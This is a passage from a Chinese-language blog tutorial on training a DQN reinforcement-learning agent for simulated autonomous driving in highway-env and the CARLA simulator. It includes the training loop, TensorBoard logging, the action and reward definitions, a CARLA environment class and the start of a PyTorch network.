class="string">&quot;Kinematics&quot;</span>,</span><br><span class="line">        <span class="string">&quot;vehicles_count&quot;</span>: <span class="number">5</span>,</span><br><span class="line">        <span class="string">&quot;features&quot;</span>: [<span class="string">&quot;presence&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;vx&quot;</span>, <span class="string">&quot;vy&quot;</span>, <span class="string">&quot;cos_h&quot;</span>, <span class="string">&quot;sin_h&quot;</span>],</span><br><span class="line">        <span class="string">&quot;features_range&quot;</span>: </span><br><span class="line">            &#123;</span><br><span class="line">            <span class="string">&quot;x&quot;</span>: [-<span class="number">100</span>, <span class="number">100</span>],</span><br><span class="line">            <span class="string">&quot;y&quot;</span>: [-<span class="number">100</span>, <span class="number">100</span>],</span><br><span class="line">            <span class="string">&quot;vx&quot;</span>: [-<span class="number">20</span>, <span class="number">20</span>],</span><br><span class="line">            <span class="string">&quot;vy&quot;</span>: [-<span class="number">20</span>, <span class="number">20</span>]</span><br><span class="line">            &#125;,</span><br><span class="line">        <span class="string">&quot;absolute&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&quot;order&quot;</span>: <span class="string">&quot;sorted&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">    <span class="string">&quot;simulation_frequency&quot;</span>: <span class="number">8</span>,  <span class="comment"># [Hz]</span></span><br><span class="line">    <span class="string">&quot;policy_frequency&quot;</span>: <span class="number">2</span>,  <span class="comment"># [Hz]</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">env = gym.make(<span class="string">&quot;highway-v0&quot;</span>)</span><br><span class="line">env.configure(config)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>训练：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gym</span><br><span class="line"><span class="keyword">import</span> highway_env</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> DQNnet <span class="keyword">import</span> DQN</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> torch.utils.tensorboard <span class="keyword">import</span> SummaryWriter</span><br><span class="line"></span><br><span class="line">writer = SummaryWriter(<span class="string">&#x27;./log&#x27;</span>)</span><br><span class="line"></span><br><span class="line">config = \</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;observation&quot;</span>:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Kinematics&quot;</span>,</span><br><span class="line">                <span class="string">&quot;vehicles_count&quot;</span>: <span class="number">5</span>,</span><br><span class="line">                <span class="string">&quot;features&quot;</span>: [<span class="string">&quot;presence&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;vx&quot;</span>, <span class="string">&quot;vy&quot;</span>, <span class="string">&quot;cos_h&quot;</span>, <span class="string">&quot;sin_h&quot;</span>],</span><br><span class="line">                <span class="string">&quot;features_range&quot;</span>:</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="string">&quot;x&quot;</span>: [-<span class="number">100</span>, <span class="number">100</span>],</span><br><span class="line">                        <span class="string">&quot;y&quot;</span>: [-<span class="number">100</span>, <span class="number">100</span>],</span><br><span class="line">                        <span class="string">&quot;vx&quot;</span>: [-<span class="number">20</span>, <span class="number">20</span>],</span><br><span class="line">                        <span class="string">&quot;vy&quot;</span>: [-<span class="number">20</span>, <span class="number">20</span>]</span><br><span class="line">                    &#125;,</span><br><span class="line">                <span class="string">&quot;absolute&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                <span class="string">&quot;order&quot;</span>: <span class="string">&quot;sorted&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">        <span class="string">&quot;simulation_frequency&quot;</span>: <span class="number">8</span>,  <span class="comment"># [Hz]</span></span><br><span class="line">        <span class="string">&quot;policy_frequency&quot;</span>: <span class="number">2</span>,  <span class="comment"># [Hz]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">env = gym.make(<span class="string">&quot;highway-v0&quot;</span>)</span><br><span class="line">env.configure(config)</span><br><span class="line"></span><br><span class="line">dqn = DQN()</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">reward = []</span><br><span class="line">avg_reward = <span class="number">0</span></span><br><span class="line">all_reward = []</span><br><span class="line"></span><br><span class="line">time_ = []</span><br><span class="line">all_time = []</span><br><span class="line"></span><br><span class="line">collision_his = []</span><br><span class="line">all_collision = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    done = <span class="literal">False</span></span><br><span class="line">    start_time = time.time()</span><br><span class="line">    s = env.reset()</span><br><span class="line">    s = s[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># while True:</span></span><br><span class="line">    <span class="comment">#     done = False</span></span><br><span class="line">    <span class="comment"># start_time = time.time()</span></span><br><span class="line">    <span class="comment"># s = env.reset()</span></span><br><span class="line">    <span class="comment"># s = s[0]</span></span><br><span class="line">    <span class="comment"># while not done:</span></span><br><span class="line">    <span class="comment">#     e = np.exp(-count / 300)  # 随机选择action的概率，随着训练次数增多逐渐降低</span></span><br><span class="line">    <span class="comment"># a = dqn.choose_action(s, e)</span></span><br><span class="line">    <span class="comment"># s_, r, done, truncated, info = env.step(a)</span></span><br><span class="line">    <span class="comment"># env.render()</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">        e = np.exp(-count / <span class="number">300</span>)  <span class="comment"># 随机选择action的概率，随着训练次数增多逐渐降低</span></span><br><span class="line">        a = dqn.choose_action(s, e)</span><br><span class="line">        s_, r, done,truncated, info = env.step(a)</span><br><span class="line">        env.render()</span><br><span class="line">        dqn.push_memory(s, a, r, s_)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((dqn.position != <span class="number">0</span>) &amp; (dqn.position % <span class="number">99</span> == <span class="number">0</span>)):</span><br><span class="line">            loss_ = dqn.learn()</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;epoch:&#x27;</span>, count)</span><br><span class="line">            avg_reward = np.mean(reward)</span><br><span class="line">            avg_time = np.mean(time_)</span><br><span class="line">            collision_rate = np.mean(collision_his)</span><br><span class="line"></span><br><span class="line">            all_reward.append(avg_reward)</span><br><span class="line">            all_time.append(avg_time)</span><br><span class="line">            all_collision.append(collision_rate)</span><br><span class="line"></span><br><span class="line">            writer.add_scalar(<span class="string">&#x27;result/reward&#x27;</span>, np.asarray(avg_reward), count)</span><br><span class="line">            writer.add_scalar(<span class="string">&#x27;result/time&#x27;</span>, np.asarray(avg_time), count)</span><br><span class="line">            writer.add_scalar(<span class="string">&#x27;result/collision&#x27;</span>, np.asarray(collision_rate), count)</span><br><span class="line"></span><br><span class="line">            reward = []</span><br><span class="line">            time_ = []</span><br><span class="line">            collision_his = []</span><br><span class="line"></span><br><span class="line">        s = s_</span><br><span class="line">        reward.append(r)</span><br><span class="line"></span><br><span class="line">    end_time = time.time()</span><br><span class="line">    episode_time = end_time - start_time</span><br><span class="line">    time_.append(episode_time)</span><br><span class="line"></span><br><span class="line">    is_collision = <span class="number">1</span> <span class="keyword">if</span> info[<span class="string">&#x27;crashed&#x27;</span>] == <span class="literal">True</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    collision_his.append(is_collision)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/.io//image-20220719184300915.png" alt="image-20220719184300915"></p><p>小车进行了规避的动作，以避免发生碰撞。</p><p>在终端运行tensorboard –logdir&#x3D;.&#x2F;log可以查看可视化界面。</p><p><img src="/.io//image-20220719214959967.png" alt="image-20220719214959967"></p><p><img src="/.io//image-20220719215011582.png" alt="image-20220719215011582"></p><p>可以看出平均碰撞发生率会随训练次数增多逐渐降低，每个epoch持续的时间会逐渐延长（如果发生碰撞epoch会立刻结束）</p><p>看到原作者的效果对比，可以看出模型更快达到高reward，高time，碰撞率也下降得更快。（原作者中是每40次记录一次，相当于八百次）。</p><p><img src="/.io//image-20220719215225768.png" alt="image-20220719215225768"></p><p>没有加上模型保存代码。这个模型也不是非常好，大家看着玩就行，调参的时间成本非常高，我没继续调下去了。</p><h3 id="4-3-使用CARLA模拟器实现DQN自动驾驶"><a href="#4-3-使用CARLA模拟器实现DQN自动驾驶" class="headerlink" title="4.3  使用CARLA模拟器实现DQN自动驾驶"></a>4.3  使用CARLA模拟器实现DQN自动驾驶</h3><p>由于图像数据的结构复杂，数据量大，考虑到用没有超强算力的电脑运行程序的时候，为了简化模型结构，对数据进行压缩，摄像头传来的图像先设置为80*60。</p><p>为了让模型能学到正确的参数，需要对智能体的action和reward进行定义，汽车控制的主要3个参数可以量化成油门力度([0,1])，刹车力度([0,1])，方向盘角度([-1,1])，是否倒档(True&#x2F;False)。但是根据一般的开车习惯，这些变量并不是相互独立的，比如油门和刹车一般不会同时踩下（除了漂移），定义DQN的输出时，为了计算对应action的Q值，先对action量化为几个类别：</p><p>1.直行加速：throttle&#x3D;1, brake&#x3D;0, steer&#x3D;0, reverse&#x3D;False<br>2.左转（满舵）：throttle&#x3D;0.5, brake&#x3D;0, steer&#x3D;-1, reverse&#x3D;False<br>3.右转（满舵）：throttle&#x3D;0.5, brake&#x3D;0, steer&#x3D;1, reverse&#x3D;False<br>4.直行减速：throttle&#x3D;0, brake&#x3D;0.5, steer&#x3D;0, reverse&#x3D;False<br>5.直行倒车：throttle&#x3D;1, brake&#x3D;0, steer&#x3D;0, reverse&#x3D;True</p><p>之后需要定义汽车行驶的reward，我们可以随机在地图上另选一点，将其坐标作为驾驶的终点，每一帧刷新时，如下定义reward：</p><p>1.若发生碰撞，reward&#x3D;-200<br>2.若下一帧和当前帧相比，汽车到终点的距离更近，reward&#x3D;1<br>3.若下一帧和当前帧相比，汽车到终点的距离更远，reward&#x3D;-1</p><p>定义好之后我们需要将上述功能封装进step()函数并加入环境class，修改后环境class代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> abc</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> types <span class="keyword">import</span> LambdaType</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sys.path.append(glob.glob(<span class="string">&#x27;../carla/dist/carla-*%d.%d-%s.egg&#x27;</span> % (</span><br><span class="line">        sys.version_info.major,</span><br><span class="line">        sys.version_info.minor,</span><br><span class="line">        <span class="string">&#x27;win-amd64&#x27;</span> <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;linux-x86_64&#x27;</span>))[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">except</span> IndexError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> carla</span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"> </span><br><span class="line">IM_WIDTH = <span class="number">80</span></span><br><span class="line">IM_HEIGHT = <span class="number">60</span></span><br><span class="line">SHOW_PREVIEW = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">SECOND_PER_EPISODE = <span class="number">10</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car_Env</span>():</span><br><span class="line">    SHOW_CAM = SHOW_PREVIEW</span><br><span class="line">    STEER_AMT = <span class="number">1.0</span></span><br><span class="line">    im_width = IM_WIDTH</span><br><span class="line">    im_height = IM_HEIGHT</span><br><span class="line">    front_camera = <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.client = carla.Client(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">2000</span>)</span><br><span class="line">        self.client.set_timeout(<span class="number">10.0</span>)</span><br><span class="line">        self.world = self.client.get_world()</span><br><span class="line">        self.blueprint_library = self.world.get_blueprint_library()</span><br><span class="line">        self.model_3 = self.blueprint_library.<span class="built_in">filter</span>(<span class="string">&#x27;model3&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">reset</span>(<span class="params">self</span>):</span><br><span class="line">        self.collision_hist = []</span><br><span class="line">        self.radar_hist = []</span><br><span class="line">        self.actor_list = []</span><br><span class="line">        self.transform = self.world.get_map().get_spawn_points()[<span class="number">100</span>] <span class="comment">#spwan_points共265个点，选第一个点作为初始化小车的位置</span></span><br><span class="line">        self.vehicle = self.world.spawn_actor(self.model_3 , self.transform)</span><br><span class="line"> </span><br><span class="line">        self.actor_list.append(self.vehicle)</span><br><span class="line"> </span><br><span class="line">        self.rgb_cam = self.blueprint_library.find(<span class="string">&#x27;sensor.camera.rgb&#x27;</span>)</span><br><span class="line">        self.rgb_cam.set_attribute(<span class="string">&#x27;image_size_x&#x27;</span>,<span class="string">f&#x27;<span class="subst">&#123;self.im_width&#125;</span>&#x27;</span>)</span><br><span class="line">        self.rgb_cam.set_attribute(<span class="string">&#x27;image_size_y&#x27;</span>,<span class="string">f&#x27;<span class="subst">&#123;self.im_height&#125;</span>&#x27;</span>)</span><br><span class="line">        self.rgb_cam.set_attribute(<span class="string">&#x27;fov&#x27;</span>,<span class="string">f&#x27;110&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">        transform = carla.Transform(carla.Location(x=<span class="number">2.5</span> ,z=<span class="number">0.7</span> ))</span><br><span class="line">        self.sensor = self.world.spawn_actor(self.rgb_cam,transform, attach_to=self.vehicle)</span><br><span class="line">        self.actor_list.append(self.sensor)</span><br><span class="line">        self.sensor.listen(<span class="keyword">lambda</span> data: self.process_img(data))</span><br><span class="line"> </span><br><span class="line">        self.vehicle.apply_control(carla.VehicleControl(throttle=<span class="number">0.0</span>, brake=<span class="number">0.0</span>))</span><br><span class="line">        </span><br><span class="line">        time.sleep(<span class="number">4</span>)</span><br><span class="line"> </span><br><span class="line">       </span><br><span class="line">        <span class="comment">#collision sensor</span></span><br><span class="line">        colsensor = self.blueprint_library.find(<span class="string">&#x27;sensor.other.collision&#x27;</span>)</span><br><span class="line">        self.colsensor = self.world.spawn_actor(colsensor, transform, attach_to = self.vehicle)</span><br><span class="line">        self.actor_list.append(self.colsensor)</span><br><span class="line">        self.colsensor.listen(<span class="keyword">lambda</span> event: self.collision_data(event))</span><br><span class="line">       </span><br><span class="line"> </span><br><span class="line">        <span class="comment">#target_transform 定义驾驶目的地坐标</span></span><br><span class="line">        self.target_transform = self.world.get_map().get_spawn_points()[<span class="number">101</span>]</span><br><span class="line">        self.target_dis = self.target_transform.location.distance(self.vehicle.get_location())</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">while</span> self.front_camera <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            time.sleep(<span class="number">0.01</span>)</span><br><span class="line"> </span><br><span class="line">        self.episode_start = time.time()</span><br><span class="line">        self.vehicle.apply_control(carla.VehicleControl(throttle=<span class="number">0.0</span>, brake=<span class="number">0.0</span>))</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">return</span> self.front_camera</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">collision_data</span>(<span class="params">self, event</span>):</span><br><span class="line">        self.collision_hist.append(event)</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">radar_data</span>(<span class="params">self, mesure</span>):</span><br><span class="line">        self.radar_hist.append(mesure)</span><br><span class="line">                </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_img</span>(<span class="params">self, image</span>):</span><br><span class="line">        i = np.array(image.raw_data)</span><br><span class="line">        i2 = i.reshape((self.im_height, self.im_width , <span class="number">4</span>))</span><br><span class="line">        i3 = i2[: , : , : <span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> self.SHOW_CAM:</span><br><span class="line">            cv2.imshow(<span class="string">&quot;&quot;</span>,i3)</span><br><span class="line">            cv2.waitKey(<span class="number">1</span>)</span><br><span class="line">        self.front_camera = i3</span><br><span class="line">        <span class="keyword">return</span> i3/<span class="number">255.0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">step</span>(<span class="params">self, action</span>):</span><br><span class="line">        last_dis = self.target_dis  </span><br><span class="line">        <span class="keyword">if</span> action==<span class="number">0</span>:            </span><br><span class="line">            self.vehicle.apply_control(carla.VehicleControl(throttle=<span class="number">1.0</span>, steer=<span class="number">0.0</span>, brake=<span class="number">0.0</span>, hand_brake=<span class="literal">False</span>, reverse=<span class="literal">False</span>))</span><br><span class="line">        <span class="keyword">elif</span> action==<span class="number">1</span>:</span><br><span class="line">            self.vehicle.apply_control(carla.VehicleControl(throttle=<span class="number">0.5</span>, steer=-<span class="number">1</span>, brake=<span class="number">0.0</span>, hand_brake=<span class="literal">False</span>, reverse=<span class="literal">False</span>))</span><br><span class="line">        <span class="keyword">elif</span> action==<span class="number">2</span>:</span><br><span class="line">            self.vehicle.apply_control(carla.VehicleControl(throttle=<span class="number">0.5</span>, steer=<span class="number">1</span>, brake=<span class="number">0.0</span>, hand_brake=<span class="literal">False</span>, reverse=<span class="literal">False</span>))</span><br><span class="line">        <span class="keyword">elif</span> action==<span class="number">4</span>:</span><br><span class="line">            self.vehicle.apply_control(carla.VehicleControl(throttle=<span class="number">0.0</span>, steer=<span class="number">0.0</span>, brake=<span class="number">0.5</span>, hand_brake=<span class="literal">False</span>, reverse=<span class="literal">False</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.vehicle.apply_control(carla.VehicleControl(throttle=<span class="number">1.0</span>, steer=<span class="number">0.0</span>, brake=<span class="number">0.0</span>, hand_brake=<span class="literal">False</span>, reverse=<span class="literal">True</span>))</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        self.target_dis = self.target_transform.location.distance(self.vehicle.get_location())  </span><br><span class="line">                       </span><br><span class="line">        v = self.vehicle.get_velocity()</span><br><span class="line">        kmh = <span class="built_in">int</span>(<span class="number">3.6</span> * math.sqrt(v.x**<span class="number">2</span> + v.y**<span class="number">2</span> + v.z**<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.collision_hist)!=<span class="number">0</span>:</span><br><span class="line">            done = <span class="literal">True</span></span><br><span class="line">            reward = -<span class="number">200</span></span><br><span class="line">        <span class="keyword">elif</span> last_dis &lt; self.target_dis:  <span class="comment">#距离目标越来越远了</span></span><br><span class="line">            done = <span class="literal">False</span></span><br><span class="line">            reward = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            done = <span class="literal">False</span></span><br><span class="line">            reward = <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> self.episode_start + SECOND_PER_EPISODE &lt; time.time():</span><br><span class="line">            done = <span class="literal">True</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> self.front_camera, reward, done, <span class="literal">None</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>定义好环境后我们就可以开始定义DQN网络了，选择pytorch框架。在训练之前，还要开辟一个存储空间，用来保存小车每次和环境交互的数据(push_memory()函数)，每次训练都从buffer中随机抽取batch_size的样本(get_sample()函数)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">from</span> torch.autograd <span class="keyword">import</span> Variable</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> T</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> FloatTensor, LongTensor, ByteTensor</span><br><span class="line">Tensor = FloatTensor</span><br><span class="line"> </span><br><span class="line">EPSILON = <span class="number">0.9</span>       <span class="comment"># epsilon used for epsilon greedy approach</span></span><br><span class="line">GAMMA = <span class="number">0.9</span></span><br><span class="line">TARGET_NETWORK_REPLACE_FREQ = <span class="number">100</span>       <span class="comment"># How frequently target netowrk updates</span></span><br><span class="line">MEMORY_CAPACITY = <span class="number">200</span></span><br><span class="line">BATCH_SIZE = <span class="number">32</span></span><br><span class="line">LR = <span class="number">0.01</span>           <span class="comment"># learning rate</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Net</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(Net, self).__init__()</span><br><span class="line">        self.conv1 = nn.Conv2d(<span class="number">3</span>, <span class="number">16</span>, kernel_size=<span class="number">5</span>, stride=<span class="number">2</span>)</span><br><span class="line">        self.bn1 = nn.BatchNorm2d(<span class="number">16</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="number">16</span>, <span class="number">32</span>, kernel_size=<span class="number">5</span>, stride=<span class="number">2</span>)</span><br><span class="line">        self.bn2 = nn.BatchNorm2d(<span class="number">32</span>)</span><br><span class="line">        